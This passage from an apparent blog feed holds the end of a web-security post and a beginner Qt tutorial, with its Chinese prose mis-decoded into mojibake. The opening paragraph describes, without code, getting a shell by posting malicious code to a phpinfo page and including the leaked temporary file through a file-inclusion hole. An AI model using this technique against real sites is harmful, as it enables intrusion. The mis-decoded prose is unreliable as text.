<p>è¿™æ¬¡é€šè¿‡phpinfoæ¥getshellçš„å…³é”®ï¼Œphpinfoå¯ä»¥è®©æˆ‘ä»¬è·å¾—ä¸´æ—¶æ–‡ä»¶è·¯å¾„ã€‚å‘phpinfoé¡µé¢postæ¶æ„ä»£ç ï¼Œå¯ä»¥åœ¨_FILES[â€œfile1â€]ä¸­çœ‹åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœè¯¥ç½‘ç«™å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¾¿å¯ä»¥å°†æ¶æ„ä»£ç å­˜å‚¨æˆ‘ä»¬å·²çŸ¥çš„ç»å¯¹è·¯å¾„å»åŒ…å«å®ƒgetshellã€‚</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤§äºŒç¨‹åºè®¾è®¡ç»¼åˆå®è·µ</title>
    <url>/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h1 id="ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ"><a href="#ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ" class="headerlink" title="ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ"></a>ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ</h1><p>å›¾å½¢åŒ–ç¼–ç¨‹</p>
<p>è¿™ä¸åŒè¯­è¨€åˆ†æ•°è¿˜ä¸å¤ªä¸€æ ·ï¼Œæœ€åç”¨Qtäº†</p>
<p>å››ä¸ªæ˜ŸæœŸå››ä¸ªå®éªŒï¼Œåº”è¯¥é—®é¢˜ä¸å¤§</p>
<p>è¶ä¸‹æ¬¡æ¯”èµ›ä¹‹å‰æŠŠè¿™ä¸ªå®éªŒå¼„å®Œ</p>
<p>å…ˆè´´é“¾æ¥</p>
<p><a href="https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p>
<p>ä¸‹é¢å°½é‡ç”¨ä»£ç å’Œæ³¨é‡Šä»‹ç»åŸºç¡€çŸ¥è¯†ï¼Œå†™å¾—æœ‰ç‚¹ä¹±ï¼Œå¯ä»¥çœ‹bç«™å»å­¦</p>
<p>ä¸»è¦æ˜¯è‡ªå·±è®°å½•ä¸€ä¸‹çŸ¥è¯†</p>
<p>æˆ‘ç”¨çš„æ˜¯5.14çš„ bç«™åº”è¯¥æ˜¯5.5çš„ æœ‰äº›çŸ¥è¯†ä¼šæœ‰ç‚¹å‡ºå…¥</p>
<h1 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h1><h2 id="0x01-åˆ›å»ºqté¡¹ç›®"><a href="#0x01-åˆ›å»ºqté¡¹ç›®" class="headerlink" title="0x01 åˆ›å»ºqté¡¹ç›®"></a>0x01 åˆ›å»ºqté¡¹ç›®</h2><p>å®‰è£…å®Œæˆå</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png" alt="image-20201014194802950"></p>
<p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹ä¸Šé¢è¿™ä¸ªå†…å®¹</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png" alt="Qt5 æ¨¡å—"></p>
<h3 id="1-æ–°å»ºé¡¹ç›®"><a href="#1-æ–°å»ºé¡¹ç›®" class="headerlink" title="1.æ–°å»ºé¡¹ç›®"></a>1.æ–°å»ºé¡¹ç›®</h3><p>é€‰ç¬¬ä¸€ä¸ª</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png" alt="image-20201207153603804"></p>
<p>ä¸€ç›´é»˜è®¤ï¼Œç›´åˆ°é€‰ç±»å<img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png" alt="image-20201207153634092"></p>
<p>ä¹‹åä¸€ç›´é»˜è®¤å°±å¯ä»¥äº†</p>
<p>æœ€ç»ˆç•Œé¢å¦‚å›¾</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png" alt="image-20201207153758775"></p>
<h3 id="2-proæ–‡ä»¶"><a href="#2-proæ–‡ä»¶" class="headerlink" title="2. .proæ–‡ä»¶"></a>2. .proæ–‡ä»¶</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QT       += core gui  <span class="comment">//åŒ…å«çš„æ¨¡å—</span></span><br><span class="line">greaterThan(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets <span class="comment">//å¤§äºQt4ç‰ˆæœ¬ æ‰åŒ…å«widgetæ¨¡å—</span></span><br><span class="line">TARGET = QtFirst  <span class="comment">//åº”ç”¨ç¨‹åºå  ç”Ÿæˆçš„.exeç¨‹åºåç§°</span></span><br><span class="line">TEMPLATE = app    <span class="comment">//æ¨¡æ¿ç±»å‹    åº”ç”¨ç¨‹åºæ¨¡æ¿</span></span><br><span class="line">SOURCES += main.cpp\   <span class="comment">//æºæ–‡ä»¶</span></span><br><span class="line">        mywidget.cpp</span><br><span class="line">HEADERS  += mywidget.h   <span class="comment">//å¤´æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong><em>\</em>.proå°±æ˜¯å·¥ç¨‹æ–‡ä»¶(project)ï¼Œå®ƒæ˜¯qmakeè‡ªåŠ¨ç”Ÿæˆçš„ç”¨äºç”Ÿäº§makefileçš„é…ç½®æ–‡ä»¶**</strong>ã€‚</p>
</blockquote>
<h3 id="3-main-cpp"><a href="#3-main-cpp" class="headerlink" title="3.main.cpp"></a>3.main.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a åº”ç”¨ç¨‹åºå¯¹è±¡ åœ¨Qtä¸­ æœ‰ä¸”ä»…æœ‰ä¸€ä¸ª</span></span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//çª—å£å¯¹è±¡ MainWindow</span></span><br><span class="line">    MainWindow w;</span><br><span class="line">    <span class="comment">//å¿…é¡»è¦showæ–¹æ³•æ‰å¯ä»¥å±•ç¤º</span></span><br><span class="line">    w.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§£é‡Šï¼š</p>
<ul>
<li>Qtç³»ç»Ÿæä¾›çš„æ ‡å‡†ç±»åå£°æ˜å¤´æ–‡ä»¶æ²¡æœ‰.håç¼€</li>
<li>Qtä¸€ä¸ªç±»å¯¹åº”ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œç±»åå°±æ˜¯å¤´æ–‡ä»¶å</li>
<li>QApplicationåº”ç”¨ç¨‹åºç±»</li>
<li><ol>
<li>ç®¡ç†å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºçš„æ§åˆ¶æµå’Œä¸»è¦è®¾ç½®ã€‚</li>
<li>æ˜¯Qtçš„æ•´ä¸ªåå°ç®¡ç†çš„å‘½è„‰å®ƒ<strong>åŒ…å«ä¸»äº‹ä»¶å¾ªç¯**</strong>ï¼Œåœ¨å…¶ä¸­æ¥è‡ªçª—å£ç³»ç»Ÿå’Œå…¶å®ƒèµ„æºçš„<strong>*æ‰€æœ‰äº‹ä»¶å¤„ç†å’Œè°ƒåº¦ã€‚å®ƒä¹Ÿå¤„ç†åº”ç”¨ç¨‹åºçš„åˆå§‹åŒ–å’Œç»“æŸ</strong>ï¼Œå¹¶ä¸”<strong>æä¾›å¯¹è¯ç®¡ç†</strong>ã€‚</li>
<li>å¯¹äºä»»ä½•ä¸€ä¸ªä½¿ç”¨Qtçš„å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºï¼Œéƒ½æ­£å¥½å­˜åœ¨ä¸€ä¸ªQApplication å¯¹è±¡ï¼Œè€Œä¸è®ºè¿™ä¸ªåº”ç”¨ç¨‹åºåœ¨åŒä¸€æ—¶é—´å†…æ˜¯ä¸æ˜¯æœ‰0ã€1ã€2æˆ–æ›´å¤šä¸ªçª—å£ã€‚</li>
</ol>
</li>
<li><p>a.exec()</p>
</li>
</ul>
<p>ç¨‹åºè¿›å…¥æ¶ˆæ¯å¾ªç¯ï¼Œç­‰å¾…å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå“åº”ã€‚è¿™é‡Œmain()æŠŠæ§åˆ¶æƒè½¬äº¤ç»™Qtï¼ŒQtå®Œæˆäº‹ä»¶å¤„ç†å·¥ä½œï¼Œå½“åº”ç”¨ç¨‹åºé€€å‡ºçš„æ—¶å€™exec()çš„å€¼å°±ä¼šè¿”å›ã€‚<strong>åœ¨exec()ä¸­ï¼ŒQtæ¥å—å¹¶å¤„ç†ç”¨æˆ·å’Œç³»ç»Ÿçš„äº‹ä»¶å¹¶ä¸”æŠŠå®ƒä»¬ä¼ é€’ç»™é€‚å½“çš„çª—å£éƒ¨ä»¶ã€‚</strong></p>
<h3 id="4-å¿«æ·é”®åŠå‘½åè§„èŒƒ"><a href="#4-å¿«æ·é”®åŠå‘½åè§„èŒƒ" class="headerlink" title="4.å¿«æ·é”®åŠå‘½åè§„èŒƒ"></a>4.å¿«æ·é”®åŠå‘½åè§„èŒƒ</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å‘½åè§„èŒƒ </span></span><br><span class="line"><span class="comment">//ç±»å é¦–å­—æ¯å¤§å†™ï¼Œå•è¯å’Œå•è¯ä¹‹é—´é¦–å­—æ¯å¤§å†™</span></span><br><span class="line"><span class="comment">//å‡½æ•°å é¦–å­—æ¯å°å†™</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + / æ³¨é‡Š</span></span><br><span class="line"><span class="comment">//ctrl + r è¿è¡Œ</span></span><br><span class="line"><span class="comment">//ctrl + b ç¼–è¯‘</span></span><br><span class="line"><span class="comment">//f1 å¸®åŠ©æ–‡æ¡£</span></span><br><span class="line"><span class="comment">//ctrl + shift + ä¸Š ä¸Šç§»</span></span><br><span class="line"><span class="comment">//ctrl + i å¯¹é½</span></span><br><span class="line"><span class="comment">//f4 åˆ‡æ¢.cpp å’Œ .h</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02-æ–°å»ºQtç¨‹åº"><a href="#0x02-æ–°å»ºQtç¨‹åº" class="headerlink" title="0x02 æ–°å»ºQtç¨‹åº"></a>0x02 æ–°å»ºQtç¨‹åº</h2><h3 id="1-QPushButton"><a href="#1-QPushButton" class="headerlink" title="1.QPushButton"></a>1.QPushButton</h3><p>åˆ›å»ºæŒ‰é’®</p>
<p>æŠŠä¸‹é¢è¿™æ®µä»£ç å¤åˆ¶åˆ°widget.cpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">//æŒ‰é’®æ“ä½œ</span></span><br><span class="line">	  <span class="comment">//åˆ›å»ºç¬¬ä¸€ä¸ªæŒ‰é’®</span></span><br><span class="line">    QPushButton * btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    <span class="comment">//showä»¥é¡¶å±‚æ–¹å¼å¼¹å‡ºæ§ä»¶</span></span><br><span class="line">    btn-&gt;show(); </span><br><span class="line">    <span class="comment">//è®¾ç½®çˆ¶äº²</span></span><br><span class="line">    btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//æ˜¾ç¤ºæ–‡æœ¬</span></span><br><span class="line">    btn-&gt;setText(<span class="string">"ç¬¬ä¸€ä¸ª"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ­¤å¤–è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•è¿›è¡Œæ“ä½œ</span></span><br><span class="line">    <span class="comment">//åˆ›å»ºç¬¬äºŒä¸ªæŒ‰é’®</span></span><br><span class="line">    <span class="comment">//æŒ‰ç…§æ§ä»¶å¤§å°åˆ›å»ºçª—å£</span></span><br><span class="line">    QPushButton * btn2 = <span class="keyword">new</span> QPushButton(<span class="string">"ç¬¬äºŒä¸ª"</span>,<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//ç§»åŠ¨btn2æŒ‰é’®</span></span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//é‡ç½®æŒ‰é’®å¤§å°</span></span><br><span class="line">    btn2-&gt;resize(<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//çª—å£æ“ä½œ</span></span><br><span class="line">    <span class="comment">//é‡ç½®çª—å£å¤§å°</span></span><br><span class="line">    resize(<span class="number">600</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®å›ºå®šçª—å£å¤§å°</span></span><br><span class="line">    <span class="comment">//setFixedSize(600,400);</span></span><br><span class="line">    <span class="comment">//è®¾ç½®çª—å£æ ‡é¢˜</span></span><br><span class="line">    setWindowTitle(<span class="string">"è®¡ç®—å™¨"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png" alt="image-20201207155120350"></p>
<h3 id="2-å¯¹è±¡æ ‘"><a href="#2-å¯¹è±¡æ ‘" class="headerlink" title="2.å¯¹è±¡æ ‘"></a>2.å¯¹è±¡æ ‘</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png" alt="image-20201207155310260"></p>
<p>è‡ªå·±åˆ›å»ºä¸€ä¸ªMyPushButton</p>
<p>åŒæ—¶ç»§æ‰¿QPushButton</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png" alt="image-20201207155345296"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png" alt="image-20201207111505680"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png" alt="image-20201207111746909"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png" alt="image-20201207111806797"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png" alt="image-20201207111921782"></p>
<p>ä»£ç å¦‚ä¸‹</p>
<p><code>mypushbutton.cpp</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mypushbutton.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æŒ‰é’®æ„é€ è°ƒç”¨"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyPushButton::~MyPushButton()</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æŒ‰é’®æ„é€ ææ„"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>mypushbutton.h</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPUSHBUTTON_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPushButton</span> :</span> <span class="keyword">public</span> QPushButton</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyPushButton</span><span class="params">(QWidget *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">     ~MyPushButton();</span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure>
<p><code>widget.cpp</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºè‡ªå·±æŒ‰é’®å¯¹è±¡</span></span><br><span class="line">MyPushButton *btn3 = <span class="keyword">new</span> MyPushButton;</span><br><span class="line">btn3-&gt;show();</span><br><span class="line">btn3-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">btn3-&gt;setText(<span class="string">"æˆ‘çš„æŒ‰é’®"</span>);</span><br><span class="line">btn3-&gt;<span class="built_in">move</span>(<span class="number">200</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<p>å›¾ç¤ºå¦‚ä¸‹</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png" alt="image-20201207215449993"></p>
<h2 id="0x03-ä¿¡å·å’Œæ§½çš„æœºåˆ¶"><a href="#0x03-ä¿¡å·å’Œæ§½çš„æœºåˆ¶" class="headerlink" title="0x03 ä¿¡å·å’Œæ§½çš„æœºåˆ¶"></a>0x03 ä¿¡å·å’Œæ§½çš„æœºåˆ¶</h2><h3 id="1-ä¿¡å·å’Œæ§½"><a href="#1-ä¿¡å·å’Œæ§½" class="headerlink" title="1.ä¿¡å·å’Œæ§½"></a>1.ä¿¡å·å’Œæ§½</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png" alt="Qtä¿¡å·å’Œæ§½ "></p>
<p>åŸºæœ¬çš„æ¥å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;ç»™æˆ‘çš„æŒ‰é’®ä¸€ä¸ªå…³é—­çª—å£çš„åŠŸèƒ½</span><br><span class="line">&#x2F;&#x2F;å‚æ•°1 ä¿¡å·å‘é€è€… 	å‚æ•°2 å‘é€çš„ä¿¡å·(å‡½æ•°åœ°å€)	 å‚æ•°3 ä¿¡å·æ¥æ”¶è€… å‚æ•°4 å¤„ç†çš„æ§½å‡½æ•°</span><br><span class="line">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure>
<h4 id="è‡ªå®šä¹‰ä¿¡å·å’Œæ§½"><a href="#è‡ªå®šä¹‰ä¿¡å·å’Œæ§½" class="headerlink" title="è‡ªå®šä¹‰ä¿¡å·å’Œæ§½"></a><strong>è‡ªå®šä¹‰ä¿¡å·å’Œæ§½</strong></h4><p>è‡ªå®šä¹‰ä¿¡å·</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„.hæ–‡ä»¶ä¸‹</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="comment">//è‡ªå®šä¹‰ä¿¡å· å†™åœ¨signalsä¸‹</span></span><br><span class="line">    <span class="comment">//è¿”å›å€¼æ˜¯void åªéœ€è¦å£°æ˜ ä¸éœ€è¦å®ç°</span></span><br><span class="line">    <span class="comment">//å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>è‡ªå®šä¹‰æ§½</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„.æ–‡ä»¶publicä¸­</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line">    <span class="comment">//è¿”å›å€¼æ˜¯void éœ€è¦å£°æ˜ éœ€è¦å®ç°</span></span><br><span class="line">    <span class="comment">//å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åœ¨ç±»çš„.cppä¸­å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyPushButton::recv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸ"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸ª<strong>å°çš„æ¡ˆä¾‹</strong></p>
<blockquote>
<p>ä¸€ä¸ªæŒ‰é’®å“èµ·ä¹‹å ç¨‹åºè¾“å‡ºæ¥å—æˆåŠŸ</p>
</blockquote>
<p>æˆ‘ä»¬é¦–å…ˆå¾—æœ‰ä¸¤ä¸ªç±»</p>
<ol>
<li>button</li>
<li>recv</li>
</ol>
<p>ç„¶åå¾—æœ‰<strong>ä¿¡å· æ§½å‡½æ•° å®šä¹‰æ§½å‡½æ•° </strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸ"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åå°±æ˜¯è¿æ¥,è¿™é‡Œæˆ‘ä»¬<strong>éœ€è¦æ³¨æ„åªæœ‰rangä¹‹åæ‰ä¼šæ¥å—</strong></p>
<p>æ‰€ä»¥å°±éœ€è¦rangèµ·æ¥ï¼Œ<strong>è¿™é‡Œç”¨çš„plzå‡½æ•°è®©å®ƒrang</strong></p>
<p>å…¶ä¸­çš„ä¸€äº›æˆå‘˜åéœ€è¦åœ¨<code>widget.h</code>ä¸­æ˜¯å®ç°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//widget.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Widget(QWidget *parent = <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">plz</span><span class="params">()</span></span>;</span><br><span class="line">    ~Widget();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MyPushButton * btn;</span><br><span class="line">    recv * recv1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;btn = <span class="keyword">new</span> MyPushButton(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;recv1 = <span class="keyword">new</span> recv;</span><br><span class="line">        btn-&gt;show();</span><br><span class="line">        btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">        btn-&gt;setText(<span class="string">"æˆ‘çš„æŒ‰é’®"</span>);</span><br><span class="line">        btn-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class="line">        plz();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::plz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    emit btn-&gt;rang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-é‡è½½ä¿¡å·å’Œæ§½"><a href="#2-é‡è½½ä¿¡å·å’Œæ§½" class="headerlink" title="2.é‡è½½ä¿¡å·å’Œæ§½"></a>2.é‡è½½ä¿¡å·å’Œæ§½</h3><p>æ¥ç€ä¸Šä¸ªæ¡ˆä¾‹</p>
<p><strong>é‡è½½ä¿¡å· é‡è½½æ§½ é‡æ–°å®šä¹‰æ§½å‡½æ•°</strong> </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">(QString)</span></span>;</span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">(QString s)</span></span>;</span><br><span class="line"><span class="comment">//recv.p</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">(QString second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸå“é“ƒ"</span> &lt;&lt; second &lt;&lt; <span class="string">"ç§’"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±äºè¿æ¥æ— æ³•åˆ†æ¸…å‡½æ•°åœ°å€ï¼Œè¿™é‡Œç”¨<strong>å‡½æ•°æŒ‡é’ˆæ¥ä½“ç°å‡½æ•°åœ°å€</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç®€å•è¯´ä¸€ä¸‹å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">//è¿”å›ç±»å‹ä¸ºç©º ç¬¬ä¸€ä¸ªæ‹¬å·é‡Œä¸ºæŒ‡é’ˆ ç¬¬äºŒä¸ªæ‹¬å·ä¸ºå‚æ•° =åé¢æ˜¯éœ€è¦æŒ‡å‘å‡½æ•°çš„åœ°å€</span></span><br><span class="line"><span class="keyword">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class="line"><span class="keyword">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class="line"><span class="built_in">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class="line">plz();</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸå®ç°</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png" alt="image-20201207233628350"></p>
<blockquote>
